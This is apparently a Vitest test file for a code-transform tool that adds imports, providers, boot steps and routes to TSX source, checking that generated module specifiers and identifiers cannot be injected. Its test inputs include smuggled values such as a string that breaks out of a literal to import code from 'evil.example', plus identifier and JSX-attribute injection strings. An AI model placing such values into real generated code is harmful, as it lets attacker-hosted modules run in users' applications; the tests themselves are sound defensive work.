import { parse } from '@babel/parser';
import { describe, expect, it } from 'vitest';
import { thrown } from '../testing.js';
import { quote } from './ast.js';
import { applyTransform } from './index.js';

const providers = `export function Providers({ children }) {\n  return <A>{children}</A>;\n}\n`;
const boot = `export async function main() {\n  render();\n}\n`;
const routes = `export const routes = [];\n`;
const nasty = ["x';\nimport('https://evil.example/x.js');//", 'x\\', 'a b', 'a\rb', "it's"];

function imports(source: string): string[] {
  const ast = parse(source, { sourceType: 'module', plugins: ['jsx'] });
  return ast.program.body.flatMap((n) => (n.type === 'ImportDeclaration' ? [n.source.value] : []));
}

describe('quote', () => {
  it('produces one string literal for any text, in either quote style', () => {
    for (const text of [...nasty, '"', '\u0000', 'a\tb', '${x}', '`']) {
      for (const q of ["'", '"'] as const) {
        const ast = parse(`const v = ${quote(text, q)};`, { sourceType: 'module' });
        expect(ast.program.body).toHaveLength(1);
        const init = ast.program.body[0];
        const value =
          init?.type === 'VariableDeclaration' &&
          init.declarations[0]?.init?.type === 'StringLiteral'
            ? init.declarations[0].init.value
            : undefined;
        expect(value, JSON.stringify(text)).toBe(text);
      }
    }
  });
});

describe('module specifiers are emitted as string literals', () => {
  it('add-import, with and without names', () => {
    for (const from of nasty) {
      const named = applyTransform(providers, 'a.tsx', {
        op: 'add-import',
        file: 'a.tsx',
        from,
        named: ['A'],
      });
      expect(imports(named)).toEqual([from]);
      const bare = applyTransform(providers, 'a.tsx', { op: 'add-import', file: 'a.tsx', from });
      expect(imports(bare)).toEqual([from]);
    }
  });

  it('wrap-provider, add-boot-step and add-route', () => {
    for (const from of nasty) {
      const wrapped = applyTransform(providers, 'a.tsx', {
        op: 'wrap-provider',
        file: 'a.tsx',
        component: 'P',
        from,
      });
      expect(imports(wrapped)).toEqual([from]);
      const stepped = applyTransform(boot, 'a.tsx', {
        op: 'add-boot-step',
        file: 'a.tsx',
        call: 'init',
        from,
      });
      expect(imports(stepped)).toEqual([from]);
      const routed = applyTransform(routes, 'a.tsx', {
        op: 'add-route',
        file: 'a.tsx',
        path: '/x',
        component: 'X',
        from,
      });
      expect(imports(routed)).toEqual([from]);
    }
  });
});

const code = (op: Parameters<typeof applyTransform>[2], source = providers) =>
  thrown(() => applyTransform(source, 'a.tsx', op)).code;

describe('identifiers that reach the generated code are checked', () => {
  const bad = ['a, b', 'x } from "evil"; import { y', 'class', '1a', 'a-b', '', 'a b'];
  it('add-import names', () => {
    for (const name of bad) {
      expect(code({ op: 'add-import', file: 'a.tsx', from: 'x', named: [name] }), name).toBe(
        'MFEFLOW_E208',
      );
      expect(code({ op: 'add-import', file: 'a.tsx', from: 'x', default: name }), name).toBe(
        'MFEFLOW_E208',
      );
      expect(code({ op: 'add-import', file: 'a.tsx', from: 'x', namespace: name }), name).toBe(
        'MFEFLOW_E208',
      );
    }
  });

  it('wrap-provider component and function', () => {
    for (const name of bad) {
      expect(code({ op: 'wrap-provider', file: 'a.tsx', component: name, from: 'x' }), name).toBe(
        'MFEFLOW_E208',
      );
      expect(
        code({ op: 'wrap-provider', file: 'a.tsx', component: 'P', from: 'x', function: name }),
        name,
      ).toBe('MFEFLOW_E208');
    }
  });

  it('add-boot-step call, function, before and after', () => {
    for (const name of bad) {
      const op = { op: 'add-boot-step', file: 'a.tsx', from: 'x' } as const;
      expect(code({ ...op, call: name }, boot), name).toBe('MFEFLOW_E208');
      expect(code({ ...op, call: 'go', function: name }, boot), name).toBe('MFEFLOW_E208');
      expect(code({ ...op, call: 'go', before: name }, boot), name).toBe('MFEFLOW_E208');
      expect(code({ ...op, call: 'go', after: name }, boot), name).toBe('MFEFLOW_E208');
    }
  });

  it('add-route component and routes', () => {
    for (const name of bad) {
      const op = { op: 'add-route', file: 'a.tsx', path: '/x', from: 'x' } as const;
      expect(code({ ...op, component: name }, routes), name).toBe('MFEFLOW_E208');
      expect(code({ ...op, component: 'X', routes: name }, routes), name).toBe('MFEFLOW_E208');
    }
  });

  it('wrap-provider prop names must be JSX attribute names', () => {
    for (const key of ['a b', 'a="x" onClick', 'a>', '{...x}', '', '-a', 'a-']) {
      const op = {
        op: 'wrap-provider',
        file: 'a.tsx',
        component: 'P',
        from: 'x',
        props: { [key]: 1 },
      } as const;
      expect(code(op), key).toBe('MFEFLOW_E208');
    }
    const ok = applyTransform(providers, 'a.tsx', {
      op: 'wrap-provider',
      file: 'a.tsx',
      component: 'P',
      from: 'x',
      props: { 'data-id': 'a', mode: 'b', count: 2 },
    });
    expect(ok).toContain('<P data-id="a" mode="b" count={2}>');
  });
});
